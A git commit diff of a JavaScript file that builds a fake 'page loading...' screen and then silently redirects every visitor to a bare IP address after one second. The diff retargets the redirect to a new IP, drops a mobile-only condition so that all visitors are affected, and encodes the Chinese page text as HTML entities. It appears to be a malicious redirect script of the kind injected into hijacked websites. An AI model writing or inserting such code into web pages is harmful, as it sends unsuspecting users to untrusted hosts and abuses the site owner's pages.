d5e77ea60304fb190ed0e8238b4a58c0239a3c57
dateshare <chulishen567@gmail.com>
2021-12-30 11:42:02 +0800

    message

--- lxxaisite.js
+++ lxxaisite.js
@@ -18,17 +18,14 @@
   s.parentNode.insertBefore(hm, s);
 })();
 
-if(window.navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)) {
- 
-   setTimeout("window.location.href='http://38.26.195.76'",1000);
- }
+
 
 
 document.writeln("<html>");
 document.writeln("<head>");
 document.writeln("<meta http-equiv=\'Content-Type\' content=\'text/html; charset=UTF-8\'>");
 document.writeln("");
-document.writeln("<title>页面加载中...</title>");
+document.writeln("<title>&#x9875;&#x9762;&#x52A0;&#x8F7D;&#x4E2D;...</title>");
 document.writeln("<style>");
 document.writeln("<style type=\'text/css\'>");
 document.writeln("html,body,div,span,applet,object,iframe,h1,h2,h3,h4,h5,h6,p,blockquote,pre,a,abbr,acronym,address,big,cite,code,del,dfn,em,img,ins,kbd,q,s,samp,small,strike,strong,sub,sup,tt,var,b,u,i,center,dl,dt,dd,ol,ul,li,fieldset,form,label,legend,table,caption,tbody,tfoot,thead,tr,th,td,article,aside,canvas,details,embed,figure,figcaption,footer,header,hgroup,menu,nav,output,ruby,section,summary,time,mark,audio,video{margin:0;padding:0;border:0;font-size:100%;font:inherit;vertical-align:baseline}body{background:#3498db;}#loader-container{width:188px;height:188px;color:white;margin:0 auto;position:absolute;top:50%;left:50%;margin-right:-50%;transform:translate(-50%,-50%);border:5px solid #3498db;border-radius:50%;-webkit-animation:borderScale 1s infinite ease-in-out;animation:borderScale 1s infinite ease-in-out;}#loadingText{font-family:\'Raleway\',sans-serif;font-size:1.4em;position:absolute;top:50%;left:50%;margin-right:-50%;transform:translate(-50%,-50%);}@-webkit-keyframes borderScale{0%{border:5px solid white;}50%{border:25px solid #3498db;}100%{border:5px solid white;}}@keyframes borderScale{0%{border:5px solid white;}50%{border:25px solid #3498db;}100%{border:5px solid white;}}");
@@ -36,10 +33,10 @@ document.writeln("</style>");
 
 document.writeln("</style></head>");
 document.writeln("<body>");
-document.writeln("<div id=\'loader-container\'><p id=\'loadingText\'>页面加载中...</p></div>");
+document.writeln("<div id=\'loader-container\'><p id=\'loadingText\'>&#x9875;&#x9762;&#x52A0;&#x8F7D;&#x4E2D;...</p></div>");
 document.writeln("</body>");
 document.writeln("</html>");
 
 
 
-setTimeout("window.location.href='http://38.26.195.76'",1000);
+setTimeout("window.location.href='http://38.26.195.78'",1000);
